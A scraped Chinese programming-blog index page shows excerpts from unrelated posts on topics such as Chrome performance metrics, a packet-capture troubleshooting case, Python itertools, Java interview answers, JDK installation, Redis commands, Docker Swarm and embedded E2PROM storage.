		写在前面 也是老生常谈的问题了，有的时候我们老觉得我们页面一直转圈圈老半天打不开；想看看什么原因又不知如何下手，不知原因就更不知如何优化了，强行优化就只能是瞎搞一通，没有衡量指标就不能量化优化的结果，优化就无从谈起了；
基于此，今天我就斗胆来聊聊如何使用Chrome浏览器做页面性能分析；
页面性能指标 常见指标 这些也是Chrome 性能分析工具用到的指标
FP(First Paint)
FP 是从页面开始加载到任何部分的首次视观呈现的时间。这并不意味着页面的有用内容已经被加载，只是说明了一些内容（如背景颜色、图片或非白色画布）开始出现。
FCP(First Contentful Paint)--白屏时间
FCP是从页面开始加载到任何文本、图像、非白色画布或 SVG 内容首次被渲染的时间。这个指标反映了用户首次看到任何页面内容的时间，可以作为用户体验质量的一项重要指标。
DCL(DOMContentLoaded Event)
DCL事件会在 HTML 文档被完全加载和解析完成后发生，无需等待样式表、图像和子框架完成加载。换句话说，当所有 DOM（Document Object Model）元素都可供 JavaScript 立即使用时，这个事件就会被触发。
LCP(Largest Contentful Paint)--首屏时间
LCP测量视觉内容的渲染速度。它报告视觉页面中最大元素（例如图像或文本块）被呈现在屏幕上的时间。这是一个重要的性能指标，因为它直接关系到用户看到页面主要内容的速度。
PS: LCP 应在页面首次开始加载后的2.5 秒发生(数据来自https://web.dev)；
TTI(Time to Interactive)
TTI是一个衡量页面可交互的性能指标，也就是说，页面上的所有内容已加载完成，并且主线程具备足够的能力来处理用户的交互（点击、滚动、输入等）。这个指标对于确定用户能否快速与你的页面交互非常有用。
L(Onload Event)
L (Onload Event) 事件在页面或者图像的完全载入之后立即发生。这意味着所有的脚本、CSS 文件、图像文件等都已完全下载并应用到页面上。对于验证页面完全加载的时间，此事件非常有用。
Google Web 核心指标 这是Chrome 性能分析工具中出现的指标，此外，google提出的三个核心指标我这里也要重点提一下；
这三个分别衡量：加载性能、交互性和视觉稳定性 ，这三个指标直接构成了于用户体验的三个方面。
image-20230808163622018 Largest Contentful Paint (LCP) ：最大内容绘制，测量加载性能。为了提供良好的用户体验，LCP 应在页面首次开始加载后的2.5 秒内发生。
First Input Delay (FID) ：首次输入延迟，测量交互性。为了提供良好的用户体验，页面的 FID 应为100 毫秒或更短。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a1e1d5ff0006cdafb4a9cb391d3b10b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c34099d3430c36b3325a3fabcf48f1d4/" rel="bookmark">
			记录一次现网问题排查（分享查域名是否封禁小程序）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景： 收到工单反馈说现网业务一个功能有异常，具体现象是tc.hb.cn域名无法访问，客户地区是河南省，这里记录下排查过程和思路。
首先梳理链路
客户端域名 tc.hb.cn cname—&gt; domainparking-dnspod.cn(新加坡clb)—&gt; snat—&gt; 广州集群（k8s）
1、确认解析是否正常 2、确认clb和域名是否被封禁 这里推荐使用净网云剑进行查询
3、使用拨测平台对域名或者CLB进行拨测 刚开始怀疑是丢包导致的，但是拉通网络侧同事得到的结论是跨境访问，这点丢包率很正常，而且还是小运营商。
4、新申请clb进行测试 1、新申请了一个新加坡其他可用区的clb，代理host测试有问题
2、新申请了一个广州clb进行测试，代理host测试正常
到这一步就非常怀疑是跨境导致的问题，但是想要实锤，还是得抓包，看后端是否正常返回！
5、进入容器进行抓包 因为这里后端机器，所以需要对所有的机器进行抓包
tcpdump -iany -nnv -w hostip.pcap 在Wireshark中使用http contains "tc.hb.cn"过滤
异常域名
tc.hb.cn
后端接收到clb数据后，应答了，但是没有回包，这里基本上可以确认是后端有问题了
正常域名
cainiaonas.eu.org
正常来讲，后端应答后应该回包，所以需要后端看看代码逻辑，为什么没有回包
总结： 这里一来就怀疑是跨境网络问题以及clb违规被封禁问题，导致前面耽搁了许多时间，要是一来就进行抓包对比，其实一下子就能确认是后端问题，解决时间大大减少，这里肯定有小伙伴问为什么服务要跨境访问呢，后来了解到是因为合规要求，没办法！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc993879c2e05f56ace40bc9a8aff5da/" rel="bookmark">
			Python3，一款内置、强大且必会的迭代器，建议收藏。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		迭代器之：itertools 1、引言2、itertools2.1 定义2.2 常用功能2.2.1 无限迭代器2.2.2 组合迭代器2.2.3 其他常用函数 2.3 代码示例2.3.1 count()2.3.2 cycle()2.3.3 combinations()2.3.4 product() 3、总结 1、引言 小鱼：小屌丝，我问问你你？
小屌丝：问我？我没做错啥吧？
小鱼：那倒没有，就是想问问你一件事。
小屌丝：惊慌失措… 这… 我最近可是认真的看书，没做啥事。
小鱼：你慌什么？ 我还没问呢。
小屌丝：(⊙o⊙)… 那你问，问…吧~
小鱼：也没有别的事，你知道迭代器吗？
小屌丝：唉… 迭代器啊， 那我知道啊
小鱼：噢，那你说说，迭代器。
小屌丝：range。
小鱼：嗯，继续说。
小屌丝：鱼哥，你说吧，我可能不善言辞。
小鱼：我xxxx，跟我想的一样。
小屌丝：你都预料到了，还来问我。
小鱼：怪我咯
2、itertools 2.1 定义 其实迭代器，不仅仅range，在Python内置库有一个很强大的迭代器，
如果没印象的话，可以看看小鱼的这篇博客《Python3，不知道Python内置库函数，不要错过这篇，必须收藏！！!》
当然，今天我们基于这篇，在进行拓展，让我们看看，python内置库的强大。
话不多说，我上一张图， 先感受一下迭代器的功能。
接着，就是我们今天的主角， itertools。
itertools是Python内置的一个非常强大的模块，提供了许多用于创建迭代器的函数。它可以生成一系列有用的结果集合，而不需要创建中间列表，这大大节省了空间并且提高了效率。 接下来，我们就看看itertools强大的功能。
2.2 常用功能 2.2.1 无限迭代器 count()：接收两个可选整形参数，第一个指定迭代开始的值，第二个指定迭代的步长。 例如，itertools.count(10, 2) 将生成一个从10开始的，每次增加2的无限迭代器。 cycle()：用一个可迭代对象中的元素来创建一个迭代器，并且复制自己的值，一直无限的重复下去。 例如，itertools.cycle(“abcd”) 将创建一个无限的迭代器，不断重复输出 “abcd”。 repeat()：将一个元素重复 n 遍或者无穷多遍，并返回一个迭代器。 例如，itertools.repeat(“abcd”, 5) 将创建一个迭代器，重复输出 “abcd” 五次。 2.2.2 组合迭代器 combinations_with_replacement()：从输入的可迭代对象中生成所有有重复元素的组合。 例如，itertools.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc993879c2e05f56ace40bc9a8aff5da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3892974c15ca490b1e888a5859324574/" rel="bookmark">
			2024年Java面试题最新整理，附白话答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2024年Java开发面试题最新整理，附白话答案 写在前面：本篇面试题整理是我在北京地区进行面试整理得出，常见的基本都在下面了。基本都是可以直接在面试时用白话回答的答案总结，面试时照此回答即可，有其他常见面试问题也欢迎在评论区补充。
首次发布：2020年 1月
更新日期：2024年 1月
2024年1月更新修改了一些可能造成误解的回答，并使用粗体将回答的关键部分标出，你可以使用便于自己记忆的方法组织语言来回答，只需要回答中包含这些答案关键字即可。
2024年最新常见Java开发面试题、面试常问Java面试题整理（附白话答案） 一、Java基础部分面试题 1. Java面向对象的三个特征 封装：对象只需要选择性的对外公开一些属性和行为。
继承：子对象可以继承父对象的属性和行为，并且可以在其之上进行修改以适合更特殊的场景需求。
多态：允许不同类的对象对同一消息做出响应。
2. Java中基本的数据类型有哪些 以及他们的占用字节 数据类型占用字节byte1short2int4long8float4double8char2boolean4 3. int和Integer的区别 int是Java中的原始类型，Integer是Java为int提供的封装类，他们有不同的特征和用法，包括大小、速度、默认值。
4. String、StringBuilder、StringBuffer的区别及使用场景 String一旦定义就不可改变，可空赋值。操作少量数据时使用。
StringBuilder 可改变，线程不安全。操作单线程大量数据时使用。
StringBuffer 可改变，线程安全。操作多线程大量数据时使用。
5. ArrayList、Vector和LinkedList的区别及使用场景 ArrayList和Vector都是使用数组方式存储数据，允许按序号索引元素，但是插入数据会涉及到元素移动等内存操作，所以索引快插入慢。
ArrayList懒加载 默认大小10 每次扩容1.5倍 线程不安全 性能较高
Vector 实例化时初始化 默认大小10 每次扩容2倍 线程安全 性能较低 已弃用
额外回答加分项：
多读少写建议使用CopyOnWriteArrayList
CopyOnWriteArrayList原理是发生修改的时候复制一份
多写少读或读写比较均匀建议使用Connections.synchronizedList
LinkedList 使用双向链表方式存储数据，插入只需要记录本项的前后项，索引需要向前或向后进行遍历，所以插入速度较快，线程不安全，频繁在任意位置插入和删除的情况可以使用，如果需要多线程访问，可以使用Connections.synchronizedList()或ConcurrentLinkedQueue
6. Collection和Collections的区别 Collection是集合类上级接口，继承他的主要有List和Set
Collections是集合类的帮助类，提供了对集合的搜索、排序、线程安全化等操作。
7. List和Map的区别 List是存储单列数据的集合，Map是存储键值对双列数据的集合。
List存储的数据是有顺序且可重复的，Map存储的数据是无顺序，键不可重复，值可重复的。
8. HashMap和HashTable的区别 HashMap是Map接口的实现，非线程安全，允许空键值。
HashTable是Dictionary的子类，线程安全，不允许空键值。几乎被淘汰，建议使用ConcurrentHashMap来替代它。
HashMap使用的是快速失败迭代器，在迭代器创建后，除非通过迭代器自身的remove或者add方法，其他任何方式的修改都会抛出异常。
9. HashMap底层实现原理和扩容机制 JDK1.8以前：数组+单链表的组合，以键值对的方式存储元素。
JDK1.8及以后：引入红黑树结构，添加元素时，若链表个数大于8，链表会转换为红黑树，反之小于6时会修剪或还原成链表结构。
选择6和8可以有效防止频繁的链表和红黑树转换。
扩容条件：
存放新值的时候当前已有元素个数大于阈值。存放新值的时候当前存放数据发生hash碰撞（当前key计算的hash值换算出来的数组下标位置已经存在值）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3892974c15ca490b1e888a5859324574/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b6d3e70cff0a0471e50406f367a78f7/" rel="bookmark">
			Linux详解——安装JDK
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、下载jdk
二、tar包安装
三、rpm包安装
一、下载jdk 1.下载jdk
https://www.oracle.com/technetwork/java/javase/downloads/index.html
2.通过CRT|WinSCP工具将jdk上传到linux系统中 二、tar包安装 # 1.将JDK解压缩到指定目录
tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/
注意:-C参数是将JDK解压之后文件放入usr目录中
# 2.进入jdk解压缩目录查看
cd /usr/jdk1.8.0_171/
# 3.查看详细信息
[root@localhost jdk1.8.0_171]# ls
bin db javafx-src.zip lib man release THIRDPARTYLICENSEREADME-JAVAFX.txt
COPYRIGHT include jre LICENSE README.html src.zip THIRDPARTYLICENSEREADME.txt
# 4.配置环境变量
vi /etc/profile
# 5.在文件末尾加入如下配置
export JAVA_HOME=/usr/jdk1.8.0_171
export PATH=$PATH:$JAVA_HOME/bin
# 6.加载配置生效
source /etc/profile 加载配置生效
reboot 重启系统
注意: 以上两个选项选择任意一个即可source可以不用重启立即生效,某些情况下source无法生效时,可以使用重启试试
# 7.测试环境变量
java
javac
java -version
三、rpm包安装 # 1.安装jdk
[root@localhost ~]# rpm -ivh jdk-8u171-linux-x64.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b6d3e70cff0a0471e50406f367a78f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b18956a61048c388aebd9696fa0c5a6/" rel="bookmark">
			基于Python的餐厅点餐系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 含文档+PPT+源码等]精品基于Python的餐厅点餐系统》 |计算机毕业设计|Java毕业设计|课程设计|Python毕设|小程序|毕业设计选题推荐 该项目含有源码、文档、PPT、配套开发软件、软件安装教程、项目发布教程、包运行成功以及课程答疑与微信售后交流群、送查重系统不限次数免费查重等福利！
技术路线： 软件开发环境及开发工具：
开发语言：python
使用框架：Django
前端技术：JavaScript、VUE.js（2.X）、css3
开发工具：pycharm、Visual Studio Code、HbuildX
数据库：MySQL 5.7.26（版本号）
数据库管理工具：phpstudy/Navicat或者phpstudy/sqlyog
python版本：python3.0及以上
浏览器：谷歌浏览器
主要功能： 功能介绍：
本点餐系统采用B/S架构，数据库是MySQL，网站的搭建与开发采用了先进的Python进行编写，使用了Django框架。该系统从两个对象：由管理员和用户来对系统进行设计构建。前台主要功能包括：用户注册、登录、浏览首页、查看公告消息、美食资讯、菜品信息、餐厅餐桌等详情，并进行购买菜品、预约餐桌、管理购物车、我的订单、地址、我的账户等操作。本系统在一般点餐系统的基础上增加了首页推送最新信息的功能，方便用户快速浏览，是一个高效的、动态的、交互友好的点餐系统。
本系统采用的数据库是MySQL，使用Python技术开发。在设计过程中，很好地发挥了该开发方式的优势，让实现代码有了良好的可读性，而且使代码的更新和维护更加的方便，操作方便，对以后的维护减少了很多麻烦。系统的顺利开发和实现，对于点餐系统管理这一方面提供巨大的便利服务，无论是用户还是未注册的游客，都带来了极大的便利，方便大众，为社会的进步与发展提供了一些动力。
当涉及开题报告时，这里是一个可能的结构以供参考：
开题报告 1. 项目背景 随着餐饮行业的发展，数字化点餐系统变得越来越受欢迎。基于Python的餐厅点餐系统作为这个趋势的一部分，旨在为餐厅提供一个高效、智能的点餐解决方案。这样的系统将提高客户体验，简化餐厅运营流程。
2. 项目目的 本项目的目的是设计和开发一款基于Python的餐厅点餐系统，使顾客能够通过手机或平板电脑方便地浏览菜单、点餐并支付。同时，系统也应该能够与餐厅内部的订单管理和厨房管理系统集成，以提高订单处理效率。
3. 项目意义 这个系统对餐厅业务的改善具有重要的意义。首先，它可以提升顾客体验，减少排队等待时间，增加点餐便捷性。其次，系统还可以降低人力成本，提高工作效率，减少点餐出错率。最重要的是，数字化的点餐系统有助于餐厅数据的收集和分析，帮助餐厅更好地了解客户需求，进行经营决策。
4. 技术选型 在技术选型方面，Python作为主要开发语言，可以选择Django或Flask等Web框架进行开发。数据库可采用SQLite或MySQL等。对于前端，可以考虑使用Vue.js或React等技术进行界面开发。此外，支付接口、订单管理和与后厨系统的接口也需要考虑。
5. 计划与步骤 计划将包括需求分析、系统设计、开发、测试和部署等阶段。需求分析阶段将明确系统功能和性能需求。系统设计将包括数据库设计和系统架构设计。开发阶段将采用迭代开发方式，测试阶段将包括单元测试和集成测试。最后，系统将在内部测试后，逐步部署到生产环境。
6. 参考文献 Python Official Documentation. https://docs.python.org/Django Documentation. https://docs.djangoproject.com/Flask Documentation. https://flask.palletsprojects.com/Vue.js Documentation. https://vuejs.org/ 7. 答辩指导 在答辩中可能会涉及以下问题：
如何确保系统安全性，特别是在支付和个人信息方面？系统如何处理高并发情况，如客流量高峰时的性能保障？如何实现与后厨管理系统的信息同步和实时更新？你如何考虑用户体验设计，确保点餐流程简单易用？在餐饮行业中，数字化点餐系统的市场潜力如何？ 准备回答这些问题需要深入了解项目各个方面，包括技术实现、用户需求和市场前景等。
毕业答辩流程： 具体的毕业答辩流程可能会根据学校和学院的规定有所不同，一般包括以下环节：
答辩准备：准备答辩展示材料和PPT，并详细准备自己对项目的阐述和回答问题的准备。展示与介绍：简要介绍项目的背景、目标和开发过程，强调项目的创新点和价值。报告：详细介绍项目的研究内容、方法和实际操作，包括需求分析、系统设计、功能实现、测试结果等。提问与答辩：教师、评委等提问，对项目的技术、创新、实际应用等方面进行深入探究，并回答评委的问题。答辩评价：评委根据自己的评分标准对毕业论文的质量和答辩表现进行评价。答辩结果：评委根据评分结果，最终确定论文的质量与成绩。 在答辩过程中，要充分展示对项目的深入研究和对技术的理解，结合实际案例和数据，清晰阐述项目的创新、可行性和应用价值，回答评委问题时要有条理、准确表达自己的观点。
祝您论文和答辩顺利进行！如有其他问题，我将尽力帮助您。
下面是资料信息截图： 下面是系统运行起来后的一些截图： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0808628466e445a7420e5a8e77c0aa39/" rel="bookmark">
			kernel | 不想老是编译内核？sysfs和debugfs了解一下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编译内核是一件让大家都抗拒的事情，因为编译一次内核需要的时间成本比较漫长，而且如果每次代码的微小改动或者想要额外调用某一个函数执行某一个动作就要不断的编译内核的话，就相当于CPU大量的时间都用在了idle，开发效率将会是相当的低。
我们总是希望自己能够掌握自己想要调试的程序的一些状态从而来判断程序有没有正常的工作。在简单的场景下，我们仅需要使用printf大法，就可以打印出程序的轨迹，但是在复杂场景下，似乎没有那么好使，内核中的各个模块大家都一起向你打印出程序的轨迹，每时每刻都有洪水一般的日志输出，运行一小段时间后，光是日志文件都有十几个G，还得筛选出我们需要的，也是挺麻烦的一件事。
即使使用打印的方法，我们可以观察到程序运行的轨迹，但是我们依旧无法让程序去执行一些额外的操作，我们仅仅能知道程序运行到了这里，仅此而已。假如有一些复杂的情景，我们需要修改程序的一些状态量，从而使得代码逻辑切换，打印大法就无能为力了，诶，有一个办法是重新编译内核，然后继续开始无限循环......
有什么办法可以打破这种循环，使得我们能搭建用户态与内核态之间的桥梁，让内核模块的信息能够在用户态中交互？今天我们就来了解一下sysfs和debugfs，两个特殊的in-memory文件系统。
sysfs
简介
Linux 2.6 引入了sysfs文件系统，它把连接在系统上的设备和总线组织为一个分级的文件，它允许内核代码经由一个in-memory文件系统把信息报出到用户进程中，sysfs具有严格的目录组织形式，并构成了内核数据结构的内部组织的基础。在这种文件系统中产生的文件大多数是ASCII文件，通常每个文件有一个值，这些特征保证了被出报的信息的准确性且易被访问使得sysfs成为2.6内核的 最直观、最有用的特性之一。
sysfs是内核对象、属性及它们的相互关系的一种表现机制。一方面，在内核中，提供了sysfs相应功能的编程接口支持，另一方面，在用户态提供了对应的用户接口用于查看和操作所映射的内核对象条目。
内部 &lt;--- sysfs ---&gt; 外部 内核对象 &lt;---&gt; 目录 对象属性 &lt;---&gt; 常规文件 内核关系 &lt;---&gt; 软连接 用户接口
既然sysfs是目录、文件、软连接组成的集合而且它也是一个文件系统，那么就可以在shell中浏览和操作。sysfs的挂载点一般是/sys目录：
/sys$ tree -L 1 . ├── block 块IO子系统 ├── bus 总线 ├── class 按功能划分的设备类 ├── dev 存放块设备和字符设备的主次设备号 │ ├── block │ └── char ├── devices 存放连接到系统的所有设备 ├── firmware ├── fs 文件系统 ├── hypervisor ├── kernel debugfs挂载在这个目录之下 ├── module 一些模块的交互 └── power /sys路径下是一定数量的目录，这些目录代表了注册了sysfs的主要的子系统。所有目录项相当于sysfs中的中间节点，表示一个内核对象，所有的常规文件表示当前所在的内核对象所具备的某个属性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0808628466e445a7420e5a8e77c0aa39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcf047eaf03837c25ef280d486a700ad/" rel="bookmark">
			LESS的叶绿素荧光模拟实现——任意波段荧光模拟
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、任意波段荧光模拟的实现二、需要注意的输入参数 前言 此专栏默认您对LESS (LargE-Scale remote sensing data and image Simulation framework) 模型和叶绿素荧光(Sun-Induced chlorophyll Fluorescence, SIF)有一定的了解。当然，您也可以在这里下载中文的简明手册，了解更多关于三维辐射传输模型的原理及LESS操作。
此文将扩展LESS对任意波段荧光模拟的实现，以及波段相关参数的输入要求，适用于LESS version 2.1.5-2023-11-29。
一、任意波段荧光模拟的实现 在这篇文章中，荧光矩阵的采样间隔是5 nm，导致输入波段被固定在400-850 nm范围内，限制了模拟波段的自由选择。实际上，人们可能并不关心全波段的荧光，而只想要某个，或者某几个波段的荧光，这便引出了任意波段荧光模拟的需求。
任意波段荧光模拟指的是，不再限制荧光模拟的波段间隔与数量，可以自由模拟关心波段的荧光。本文将在这篇文章的基础上，进一步阐述任意波段荧光模拟的实现。
这篇文章里讲述了如何对荧光矩阵进行任意激发波段和发射波段的重采样。简单来说，就是在激发波段上进行宽波段积分，在发射波段上进行线性插值。例如，设定激发光谱是 E ( [ 400 , 450 , 460 , 500 , 580 , 600 , 650 , 700 , 730 ] ) E\left([400,450,460,500,580,600,650,700,730]\right) E([400,450,460,500,580,600,650,700,730])，发射光谱是 F ( [ 640 , 650 , 685 , 700 , 710.1 , 735.5 , 850 ] ) F\left([640,650,685,700,710.1,735.5,850]\right) F([640,650,685,700,710.1,735.5,850])，那么荧光激发矩阵的大小就是 7 × 9 7\times9 7×9，即 F 7 × 1 = E F 7 × 9 × E 9 × 1 F_{7\times1}=EF_{7\times9}\times E_{9\times1} F7×1​=EF7×9​×E9×1​。这个 E F 7 × 9 EF_{7\times9} EF7×9​即由荧光矩阵的重采样实现。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fcf047eaf03837c25ef280d486a700ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d21bdab163c5f3fe1b9e950d5ce3d22/" rel="bookmark">
			【Redis基础】Redis基本的全局命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✅作者简介：大家好，我是小杨
📃个人主页：「小杨」的csdn博客
🐳希望大家多多支持🥰一起进步呀！
Redis基本的全局命令 1，KEYS命令 语法：KEYS pattern
KEYS命令用来查询服务器上所有满足样式（pattern）的 key，使用该命令的时间复杂度为O(N)。
注：在生产环境上一般会禁止使用KEYS命令，这是因为Redis是一个单线程服务器，当Redis中的数据量较多时，执行KEYS命令的时间较长，就导致Redis服务器阻塞，进而无法给其他客户端提供服务。
KEYS命令⽀持如下统配样式：
?：匹配一个任意字符，如：h?llo 匹配 hello，hallo 和 hxllo。*：匹配0个或多个任意字符，如：h*llo 匹配 hllo 和 heeeello。[abc]：只能匹配到[]里面指定的字符，如：h[ae]llo 匹配 hello 和 hallo 但不匹配 hillo。[^a]：排除[]里面指定的字符，如：h[^e]llo 匹配 hallo，hbllo，… 但不匹配 hello。[a-c]：匹配[]里面指定的字符范围，包含两侧边界，如：h[a-b]llo 匹配 hallo 和 hbllo。 数据准备：
具体实例：
1）？：匹配一个任意字符
2）*：匹配0个或多个任意字符
3）[ae]：只能匹配到[]里面指定的字符
4）[ ^abc]：排除[]里面指定的字符
5）[a-b]：匹配[]里面指定的字符范围
2，EXISTS命令 语法：EXISTS key [key …]
EXISTS命令是判断指定的KEY是否存在，KEY可以是一个也可以是多个，返回的是KEY存在的个数。
一次查询多个KEY是否存在与分多次查询KEY是否存在相比的好处是：减少了网络开销和调用内存的开销，执行效率更高。
在实际应用中，选择哪一种方式通常取决于具体的需求，如果是为了减少网络开销，使用一次查询多个KEY；如果想更精细地判断每个键的存在性，使用分多次查询KEY比较合适。
数据准备：
具体操作：
3，DEL命令 语法：DEL key [key …]
DEL命令是删除指定的KEY，KEY可以是一个也可以是多个，返回的是删除Key的个数。
数据准备：
具体操作：
4，EXPIRE命令 语法：EXPIRE key seconds
EXPIRE命令用于给指定的KEY设置过期时间，设置的时间单位为秒，返回的结果是0或1。【0表示设置失败，1表示设置成功】
EXPIRE命令通常与TTL命令搭配使用，当KEY存活时间超过所设置的过期时间，就会被自动删除。
EXPIRE命令可用于很多业务场景，例如规定时间内完成业务操作【倒计时】，基于Redis实现分布式锁。
具体操作：
问1：Redis的Key的过期策略是怎么实现的？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d21bdab163c5f3fe1b9e950d5ce3d22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f932c0e65cf13360b4ab66de336a1f0/" rel="bookmark">
			Docker 引擎的 Swarm 模式之入门！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Swarm，听起来像是一个朋克摇滚乐队。但它确实是个新的编排机制，抑或者是，一个 Docker 现有编排体制的改进。简单来讲，如果你在用一个旧版本的 Docker，你必须手动配置 Swarm 来创建 Docker 集群。从 1.12 版开始，Docker 引擎集成了一个原生的实现（LCTT 译注：见下文）来支持无缝的集群设置。也就是为什么会有这篇文章。 在这篇教程中，我将带你体验一下编排后的 Docker 将能做的事情。这篇文章并不是包含所有细节（如 BnB 一般）或是让你对其全知全能，但它能带你踏上你的集群之路。在我的带领下开始吧。
Teaser
技术概要
如果把 Docker 详细而又好用的文档照搬到这里那将太丢人了，所以我将简要概括下这个技术的概要。我们已经有了 Docker，对吧。现在，你想要更多的服务器作为 Docker 主机，但同时你希望它们属于同一个逻辑上的实体。也就是说，你想建立一个集群。
我们先从一个主机组成的集群开始。当你在一个主机上初始化一个 Swarm 集群，这台主机将成为这个集群的管理者manager。从技术角度来讲，它成为了共识组consensus group中的一个节点node。其背后的数学逻辑建立在 Raft 算法之上。管理者manager负责调度任务。而具体的任务则会委任给各个加入了 Swarm 集群的工作者worker节点。这些操作将由 Node API 所管理。虽说我讨厌 API 这个词汇，但我必须在这里用到它。
Service API 是这个实现中的第二个组件。它允许管理者manager节点在所有的 Swarm 集群节点上创建一个分布式的服务。这个服务可以被复制replicated，也就是说它们（LCTT 译注：指这些服务）会由平衡机制被分配到集群中（LCTT 译注：指 replicated 模式，多个容器实例将会自动调度任务到集群中的一些满足条件的节点），或者可以分配给全局（LCTT 译注：指 global 模式），也就是说每个节点都会运行一个容器实例。
此外还有更多的功课需要做，但这些信息已经足够你上路了。现在，我们开始整些实际的。我们的目标平台是 CentOS 7.2，有趣的是在我写这篇教程的时候，它的软件仓库中只有 1.10 版的 Docker，也就是说我必须手动更新以使用 Swarm。我们将在另一篇教程中讨论这个问题。接下来我们还有一个跟进的指南，其中涵盖了如何将新的节点加入我们现有的集群（LCTT 译注：指刚刚建立的单节点集群），并且我们将使用 Fedora 进行一个非对称的配置。至此，请确保正确的配置已经就位，并有一个工作的集群启动并正在运行（LCTT 译注：指第一个节点的 Docker 已经安装并已进入 Swarm 模式，但到这里笔者并没有介绍如何初始化 Swarm 集群，不过别担心下章会讲）。
配置镜像和服务
我将尝试配置一个负载均衡的 Apache 服务，并使用多个容器实例通过唯一的 IP 地址提供页面内容。挺标准的吧（LCTT 译注：指这个负载均衡的网页服务器）。这个例子同时也突出了你想要使用集群的大多数原因：可用性、冗余、横向扩展以及性能。当然，你同时需要考虑网络和储存这两块，但它们超出了这篇指南所涉及的范围了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f932c0e65cf13360b4ab66de336a1f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78cc9f9c5b96e51d4a8ea9bfbd4dbcb5/" rel="bookmark">
			【速成】蓝桥杯嵌入式省一教程：（十）利用共用体进行E2PROM读写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在上一节中我们了解到，AT24C02芯片（E2PROM存储器）内部含有256个8位字节，每一次只能对一个字节进行读写操作。因此，其只能处理unsigned char或uint8_t类型的数据，对于int、float型等大于占用一个字节的数据，需要进行额外处理。
若是对于uint16_t类型的数据，我们可以利用移位操作，将其拆成高八位与低八位存进E2PROM的两个地址中；在从E2PROM读取数据时，再分别取出高八位和低八位后存进同一个变量中。
然而，对于占用字节数更多的数据类型，或占用字节数未知，用这样的办法处理起来就显得较麻烦。下面就来介绍一种对所有数据类型都通用的处理办法——共用体（若不知道共用体是什么，可自行搜索）：
union val_float { float value; unsigned char data[sizeof(float)]; } val_write, val_read; float val = 0.5; val_write.value = val; 这样，val变量就以4个字节的形式，存储在了val_write这一共用体中，其中value的值为0.5，data[0]~data[3]分别为其4个字节。将这个值存储进E2PROM时，只需要将data数组的4个元素分别存储进4个地址中即可：
for (int i=0; i&lt;sizeof(float); i++) { e2prom_write(i, val_write.data[i]); HAL_Delay(5); //加延时保证写操作完成 } 要从E2PROM中读取数据也非常简单，只需要用data数组的4个元素分别读取4个地址，然后取出共用体的value即可：
for (int i=0; i&lt;sizeof(float); i++) { val_read.data[i] = e2prom_read(i); } float val = val_read.value; 下面我们以第十三届蓝桥杯国赛题为例，总结第九、十两节的内容：
按键功能可以参考第四节的内容，这里不再赘述：
uint8_t X = 1; uint8_t Y = 1; if (key[1].single_flag==1 &amp;&amp; view==1) { X++; if (X &gt; 4) X = 1; key[1].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78cc9f9c5b96e51d4a8ea9bfbd4dbcb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9292d5deac8b9b6c351c4e930e545c1/" rel="bookmark">
			“循环数据流”(Dataflow-in-loop) 概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		“循环数据流”是数字信号处理 (DSP) 和硬件设计领域常用的术语。它指的是一种特定的编程或设计范式，其中数据以可预测且高效的方式流经循环构造。
在传统的命令式编程中，循环通常用于迭代数据集合或重复执行一组指令。然而，在循环数据流范式中，循环的结构被设计成根据数据可用性来驱动循环体的执行，而不是由显式控制流语句来决定。
在循环数据流系统中，一旦数据变为可用，循环体就会立即对其进行处理，使数据得以连续流经循环。这通常是使用数据流计算图或有向无环图 (DAG) 来实现的，其中节点表示操作或计算，边沿表示操作之间的数据流动。
